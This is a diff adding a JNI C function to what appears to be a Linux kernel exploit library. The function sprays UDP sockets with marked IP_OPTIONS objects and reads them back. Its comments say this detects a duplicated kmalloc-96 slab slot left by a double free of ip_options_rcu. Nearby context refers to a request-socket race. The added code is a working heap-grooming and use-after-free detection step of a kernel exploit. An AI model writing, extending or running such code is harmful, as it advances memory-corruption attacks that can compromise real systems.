@@ -974,6 +974,80 @@ Java_com_inj_Native_duoDelay(JNIEnv *env, jclass cls, jint fd,
     (*env)->ReleaseByteArrayElements(env, b, pb, JNI_ABORT);
     return 0;
 }
+// Look for a duplicated slab slot.
+//
+// Freeing the same ip_options_rcu twice leaves the pointer in the kmalloc-96
+// freelist twice, so two later allocations hand out the same address. Each
+// socket here keeps its own IP_OPTIONS object alive with a unique marker
+// stamped inside it; if two of them share memory, setting the second one
+// overwrites the first and the readback no longer matches what was written.
+//
+// This is the whole point: it turns an invisible use-after-free into a
+// user-space observable, without needing to see a single SYNACK.
+JNIEXPORT jint JNICALL
+Java_com_inj_Native_dupProbe(JNIEnv *env, jclass cls, jint count, jint tag)
+{
+    int *fds;
+    int i, found = 0;
+    unsigned char opt[24];
+    unsigned char back[64];
+    (void)env;
+    (void)cls;
+
+    if (count <= 0 || count > 4096) {
+        return -1;
+    }
+    fds = (int *) calloc((size_t) count, sizeof(int));
+    if (!fds) {
+        return -2;
+    }
+
+    memset(opt, 0x01, sizeof opt);
+    opt[0] = 7;
+    opt[1] = 23;
+    opt[2] = 24;
+
+    for (i = 0; i < count; i++) {
+        fds[i] = socket(AF_INET, SOCK_DGRAM, 0);
+        if (fds[i] < 0) {
+            count = i;
+            break;
+        }
+        opt[3] = (unsigned char) (tag >> 24);
+        opt[4] = (unsigned char) (tag >> 16);
+        opt[5] = (unsigned char) (tag >> 8);
+        opt[6] = (unsigned char) tag;
+        opt[7] = (unsigned char) i;
+        setsockopt(fds[i], IPPROTO_IP, IP_OPTIONS, opt, sizeof opt);
+    }
+
+    for (i = 0; i < count; i++) {
+        socklen_t len = sizeof back;
+        if (fds[i] < 0) {
+            continue;
+        }
+        memset(back, 0xEE, sizeof back);
+        if (getsockopt(fds[i], IPPROTO_IP, IP_OPTIONS, back, &len) < 0) {
+            continue;
+        }
+        if (len < 8) {
+            continue;
+        }
+        /* The low byte has to be our index; anything else means another
+         * socket's object was written over this one. */
+        if (back[3] != (unsigned char) (tag >> 24) || back[7] != (unsigned char) i) {
+            found++;
+        }
+    }
+
+    for (i = 0; i < count; i++) {
+        if (fds[i] >= 0) {
+            close(fds[i]);
+        }
+    }
+    free(fds);
+    return found;
+}
 // Read IP_OPTIONS from a socket and report what came back.
 //
 // If the request-socket race fired, the winning child inherited an
